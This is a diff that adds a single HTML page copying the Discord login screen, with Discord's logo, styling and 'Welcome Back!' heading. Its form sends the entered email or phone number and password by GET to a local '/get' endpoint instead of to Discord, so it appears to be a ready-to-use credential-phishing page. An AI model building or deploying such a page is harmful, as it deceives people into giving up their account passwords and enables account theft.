@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Discord</title>
+    <style>
+        /* Basic Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #36393f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+
+        .login-container {
+            background-color: #36393f;
+            border-radius: 9px;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 80px;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: #202225;
+            color: white;
+        }
+
+        input::placeholder {
+            color: #b9bbbe;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #5865F2;
+            border: none;
+            border-radius: 3px;
+            font-size: 15px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .login-button:hover {
+            background-color: #4752c4;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: left;
+            color: #7fa7e4;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .label_c46f6a {
+            font-family: "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            color: #b9bbbe;
+        }
+
+        .eyebrow_c46f6a {
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .required_c46f6a {
+            color: #f04747;
+            font-weight: bold;
+        }
+
+        @media (max-width: 600px) {
+            .login-container {
+                width: 100%;
+                margin: 10px;
+            }
+
+            .logo img {
+                width: 60px;
+            }
+
+            h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Logo -->
+        <div class="logo">
+            <img src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjM2IiB2aWV3Qm94PSIwIDAgMTMwIDM2IiB3aWR0aD0iMTMwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxnIGZpbGw9IiNmZmYiPjxwYXRoIGQ9Im0yNy41MjQ3IDguMDYyNDNjLTIuMTAzNC0uOTYzNDktNC4zNTI0LTEuNjYzNzQtNi43MDM2LTIuMDYyNDMtLjI4ODguNTExMTQtLjYyNjEgMS4xOTg2MS0uODU4NyAxLjc0NTUzLTIuNDk5NS0uMzY4MDItNC45NzU5LS4zNjgwMi03LjQyOTMgMC0uMjMyNi0uNTQ2OTItLjU3NzctMS4yMzQzOS0uODY5LTEuNzQ1NTMtMi4zNTM3Ni4zOTg2OS00LjYwNTMzIDEuMTAxNS02LjcwODY0IDIuMDY3NTQtNC4yNDI0NTEgNi4yNzY3Ni01LjM5MjUwNiAxMi4zOTc2Ni00LjgxNzQ3OCAxOC40MzE1NiAyLjgxMzgwOCAyLjA1NzQgNS41NDA2OTggMy4zMDcxIDguMjIxNjI4IDQuMTI0OS42NjE5LS44OTIgMS4yNTIyOC0xLjg0MDEgMS43NjA4OS0yLjgzOTQtLjk2ODYyLS4zNjAzLTEuODk2MzQtLjgwNS0yLjc3Mjk0LTEuMzIxMy4yMzI1OS0uMTY4Ni40NjAwMS0uMzQ1LjY3OTc5LS41MjY1IDUuMzQ2NTUgMi40NDg0IDExLjE1NTU1IDIuNDQ4NCAxNi40MzgxNSAwIC4yMjI0LjE4MTUuNDQ5OC4zNTc5LjY3OTguNTI2NS0uODc5MS41MTg4LTEuODA5NC45NjM1LTIuNzc4IDEuMzIzOS41MDg2Ljk5NjcgMS4wOTY0IDEuOTQ3NCAxLjc2MDkgMi44MzkzIDIuNjgzNC0uODE3OCA1LjQxMjktMi4wNjc1IDguMjI2Ny00LjEyNzQuNjc0Ny02Ljk5NDktMS4xNTI2LTEzLjA1OTUtNC44MzAyLTE4LjQzNjY3em0tMTYuNjc1OSAxNC43MjU4N2MtMS42MDQ5IDAtMi45MjExMS0xLjQ2Ny0yLjkyMTExLTMuMjUzNHMxLjI4ODA3LTMuMjU1OSAyLjkyMTExLTMuMjU1OWMxLjYzMzEgMCAyLjk0OTMgMS40NjY5IDIuOTIxMiAzLjI1NTkuMDAyNSAxLjc4NjQtMS4yODgxIDMuMjUzNC0yLjkyMTIgMy4yNTM0em0xMC43OTUyIDBjLTEuNjA0OSAwLTIuOTIxMS0xLjQ2Ny0yLjkyMTEtMy4yNTM0czEuMjg4MS0zLjI1NTkgMi45MjExLTMuMjU1OWMxLjYzMzEgMCAyLjk0OTMgMS40NjY5IDIuOTIxMiAzLjI1NTkgMCAxLjc4NjQtMS4yODgxIDMuMjUzNC0yLjkyMTIgMy4yNTM0eiIvPjxwYXRoIGQ9Im00My42NjM2IDEyLjI4MjNoNi45NzcxYzEuNjgxNyAwIDMuMTAyNS4yNjMyIDQuMjY4Ljc4NzEgMS4xNjI5LjUyNCAyLjAzNDQgMS4yNTQ5IDIuNjExOSAyLjE5MDIuNTc3NC45MzU0Ljg2ODkgMi4wMDYyLjg2ODkgMy4yMTI1IDAgMS4xODA4LS4zMDE1IDIuMjUxNi0uOTA0NiAzLjIxLS42MDMxLjk2MDktMS41MjA4IDEuNzItMi43NTUyIDIuMjc5Ny0xLjIzNDMuNTU5Ni0yLjc2MjcuODQwOC00LjU5MDEuODQwOGgtNi40NzZ6bTYuNDA0NyA5LjMzODVjMS4xMzE4IDAgMi4wMDMzLS4yODM3IDIuNjExOS0uODQ4NS42MDgxLS41Njc0LjkxMjItMS4zMzkyLjkxMjItMi4zMTggMC0uOTA3My0uMjcwOS0xLjYzMDYtLjgxMjctMi4xNzI0cy0xLjM2Mi0uODE1Mi0yLjQ1ODYtLjgxNTJoLTIuMTgyNXY2LjE1NDF6Ii8+PHBhdGggZD0ibTY4LjgzNDYgMjQuNzg3MmMtLjk2Ni0uMjUwNS0xLjgzNzUtLjYxMzQtMi42MTE5LTEuMDkxM3YtMi45Njk3Yy41ODU1LjQ1MjQgMS4zNy44MjU1IDIuMzU0MSAxLjExOTQuOTgzNS4yOTE0IDEuOTM0NC40MzcgMi44NTQ2LjQzNy40MjkyIDAgLjc1MzktLjA1NjIuOTczNS0uMTY4Ny4yMTk2LS4xMTI0LjMyOTctLjI0NzguMzI5Ny0uNDAzNyAwLS4xNzktLjA1ODgtLjMyNzItLjE3ODktLjQ0NzNzLS4zNTI4LS4yMTk4LS42OTc2LS4zMDQxbC0yLjE0Ny0uNDgzYy0xLjIyOTMtLjI4NjMtMi4xMDA4LS42ODI0LTIuNjE5NS0xLjE5MS0uNTE4Ni0uNTA2LS43NzctMS4xNzA1LS43NzctMS45OTM0IDAtLjY5MjYuMjI1Mi0xLjI5MzIuNjgtMS44MDY5LjQ1MjMtLjUxMzcgMS4wOTYyLS45MDk4IDEuOTMyLTEuMTg4NC44MzU3LS4yODExIDEuODEyMy0uNDIxNiAyLjkzNC0uNDIxNiAxLjAwMTcgMCAxLjkxOTQuMTA3MyAyLjc1NTIuMzIyLjgzNTMuMjE0NiAxLjUyNTMuNDg4MSAyLjA3NTEuODIyOXYyLjgwODdjLS41NjIzLS4zMzQ4LTEuMjA2MS0uNTk4MS0xLjk0MjQtLjc5NzQtLjczMzMtLjE5NjgtMS40ODc3LS4yOTM5LTIuMjY0Mi0uMjkzOS0xLjEyMjIgMC0xLjY4MTYuMTkxNy0xLjY4MTYuNTcyNSAwIC4xNzg5LjA4NjkuMzExOC4yNjAzLjQwMTIuMTczOS4wODk1LjQ5MzYuMTgxNC45NTU5LjI3ODZsMS43ODkyLjMyMmMxLjE2OC4yMDE5IDIuMDM5NS41NTcyIDIuNjEyIDEuMDYzMi41NzI0LjUwNi44NTg0IDEuMjU0OC44NTg0IDIuMjQ2NCAwIDEuMDg2Mi0uNDcyNSAxLjk0NzQtMS40MjA4IDIuNTg2My0uOTQ4NC42MzktMi4yOTIzLjk1ODQtNC4wMzUzLjk1ODQtMS4wMjUyLS4wMDI1LTIuMDIxOS0uMTI3Ny0yLjk4NzgtLjM3ODJ6Ii8+PHBhdGggZD0ibTgxLjUwMDggMjQuNDExNGMtMS4wMjQ3LS41MDA5LTEuNzk5Mi0xLjE4MDctMi4zMTU0LTIuMDM5NC0uNTE2MS0uODU4Ny0uNzc3LTEuODI0OC0uNzc3LTIuODk4MiAwLTEuMDczMy4yNjg0LTIuMDM0My44MDUyLTIuODgwMi41MzY3LS44NDYgMS4zMjM4LTEuNTEwNCAyLjM2MTYtMS45OTM1IDEuMDM3My0uNDgyOSAyLjI3NjctLjcyMzIgMy43MjExLS43MjMyIDEuNzg4NyAwIDMuMjczOS4zNzU3IDQuNDU0NCAxLjEyNzF2My4yNzM4Yy0uNDE2Ni0uMjg2Mi0uOTAyMS0uNTE4OC0xLjQ1Ny0uNjk3Ny0uNTU0My0uMTc4OS0xLjE0NzQtLjI2ODQtMS43ODExLS4yNjg0LTEuMTA5MiAwLTEuOTc1Ny4yMDE5LTIuNjAxOS42MDgzLS42MjU3LjQwNjMtLjk0MDMuOTM1NC0uOTQwMyAxLjU5MjIgMCAuNjQ0LjMwNDEgMS4xNzA1LjkxMjcgMS41ODQ1LjYwODEuNDExNSAxLjQ4OTYuNjE4NSAyLjY0NzYuNjE4NS41OTUgMCAxLjE4MzEtLjA4NjkgMS43NjMtLjI1ODEuNTc4LS4xNzM4IDEuMDc2MS0uMzg2IDEuNDkyNy0uNjM2NHYzLjE2NjVjLTEuMzExMi43ODcxLTIuODMxNSAxLjE4MDctNC41NjE5IDEuMTgwNy0xLjQ1NjUtLjAwNTEtMi42OTg5LS4yNTU2LTMuNzIzNy0uNzU2NXoiLz48cGF0aCBkPSJtOTQuMjEzMiAyNC40MTE2Yy0xLjAzMjgtLjUwMDktMS44MTk4LTEuMTg1OC0yLjM2MTYtMi4wNTczcy0uODE1Mi0xLjg0MjYtLjgxNTItMi45MTYuMjcwOS0yLjAzMTguODE1Mi0yLjg3MjYgMS4zMjYzLTEuNTAwMiAyLjM1MzYtMS45NzgxYzEuMDI0Ny0uNDc3OSAyLjI0OS0uNzE1NiAzLjY2NzMtLjcxNTYgMS40MTg4IDAgMi42NDI1LjIzNzcgMy42Njc1LjcxNTZzMS44MDcgMS4xMzIyIDIuMzQ0IDEuOTY3OGMuNTM2LjgzNTguODA1IDEuNzk0Mi44MDUgMi44ODAzIDAgMS4wNzM0LS4yNjkgMi4wNDQ2LS44MDUgMi45MTYtLjUzNy44NzE2LTEuMzIxIDEuNTU2NS0yLjM1NCAyLjA1NzRzLTIuMjUxOC43NTE0LTMuNjYuNzUxNC0yLjYyNy0uMjQ4LTMuNjU2OC0uNzQ4OXptNS40MzU5LTMuMTc0MWMuNDMzOS0uNDM0NS42NTM5LTEuMDA5NS42NTM5LTEuNzI1MXMtLjIxNy0xLjI4NTUtLjY1MzktMS43MDcyYy0uNDM0Ny0uNDI0My0xLjAyNzgtLjYzNjQtMS43NzkxLS42MzY0LS43NjM5IDAtMS4zNjIuMjEyMS0xLjc5OTIuNjM2NC0uNDM0My40MjQyLS42NTE0Ljk5MTYtLjY1MTQgMS43MDcycy4yMTcxIDEuMjkwNi42NTE0IDEuNzI1MWMuNDM0Ny40MzQ0IDEuMDM1My42NTQyIDEuNzk5Mi42NTQyLjc1MTMtLjAwMjUgMS4zNDQ0LS4yMTk4IDEuNzc5MS0uNjU0MnoiLz48cGF0aCBkPSJtMTE1LjQzOCAxNC41MzY0djMuODY0MmMtLjQ1NS0uMjk5LTEuMDQzLS40NDczLTEuNzcyLS40NDczLS45NTIgMC0xLjY4OS4yODg4LTIuMi44NjY1LS41MTMuNTc3NS0uNzY5IDEuNDc3MS0uNzY5IDIuNjkzNnYzLjI5MThoLTQuMzgzdi0xMC40NjU2aDQuMjk0djMuMzI3NWMuMjM3LTEuMjE2NS42MjMtMi4xMTM1IDEuMTU1LTIuNjkzNy41MjktLjU3NzUgMS4yMTQtLjg2NjMgMi4wNDctLjg2NjMuNjMxIDAgMS4xNzMuMTQzMSAxLjYyOC40MjkzeiIvPjxwYXRoIGQ9Im0xMzAgMTEuOTI0NXYxMi44ODA2aC00LjM4M3YtMi4zNDM2Yy0uMzcuODgxOC0uOTMzIDEuNTUzOS0xLjY4OSAyLjAxMzktLjc1Ny40NTc1LTEuNjkyLjY4NzUtMi44MDIuNjg3NS0uOTkxIDAtMS44NTUtLjI0MDItMi41OTMtLjcyMzItLjczOS0uNDgzMS0xLjMwOS0xLjE0NS0xLjcxLTEuOTg1OC0uMzk5LS44NDA4LS42MDEtMS43OTE1LS42MDEtMi44NTQ3LS4wMTItMS4wOTY0LjItMi4wODAzLjYzNi0yLjk1MTguNDM1LS44NzE1IDEuMDUxLTEuNTUxMyAxLjg0My0yLjAzOTUuNzkzLS40ODgxIDEuNjk3LS43MzM0IDIuNzEyLS43MzM0IDIuMDg4IDAgMy40ODguOTA3MiA0LjIwNCAyLjcxOTJ2LTQuNjY5MnptLTUuMDM3IDkuMjQxM2MuNDQ3LS40MzQ0LjY2OS0uOTk5Mi42NjktMS42ODkzIDAtLjY2Ny0uMjE3LTEuMjExNC0uNjUxLTEuNjI4LS40MzUtLjQxNjUtMS4wMzEtLjYyNjEtMS43NzktLjYyNjEtLjczOSAwLTEuMzI5LjIxMjItMS43NzEuNjM2NHMtLjY2Mi45NzM3LS42NjIgMS42NTM1LjIyIDEuMjM0NC42NjIgMS42NjM3Yy40NDIuNDI5NCAxLjAyNS42NDQxIDEuNzUzLjY0NDEuNzM4LS4wMDI2IDEuMzMxLS4yMTk4IDEuNzc5LS42NTQzeiIvPjxwYXRoIGQ9Im02Mi4wODI0IDE1LjQ1MzljMS4yMDY3IDAgMi4xODUzLS44Nzg3IDIuMTg1My0xLjk2MjdzLS45Nzg2LTEuOTYyOC0yLjE4NTMtMS45NjI4LTIuMTg1Mi44Nzg4LTIuMTg1MiAxLjk2MjguOTc4NSAxLjk2MjcgMi4xODUyIDEuOTYyN3oiLz48cGF0aCBkPSJtNTkuODk1MyAxNi44MDZjMS4zMzkzLjU3NzYgMy4wMDA0LjYwMzIgNC4zNzA0IDB2OC4wNTU1aC00LjM3MDR6Ii8+PC9nPjwvc3ZnPg==" alt="Discord Logo">
+        </div>
+
+        <h1>Welcome Back!</h1>
+        <form action="/get" id="login-form">
+        <div class="input-group">
+            <label class="label_c46f6a eyebrow_c46f6a" for="email">EMAIL OR PHONE NUMBER <span class="required_c46f6a">*</span></label>
+            <input name="email" class="input-field" type="text" placeholder="" required>
+        </div>
+        <div class="input-group">
+            <label class="label_c46f6a eyebrow_c46f6a" for="password">PASSWORD <span class="required_c46f6a">*</span></label>
+            <input name="password" class="input-field" type="password" placeholder="" required>
+        </div>
+
+        <a href="#" class="forgot-password">Forgot your password?</a>
+
+        <button class="login-button" type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
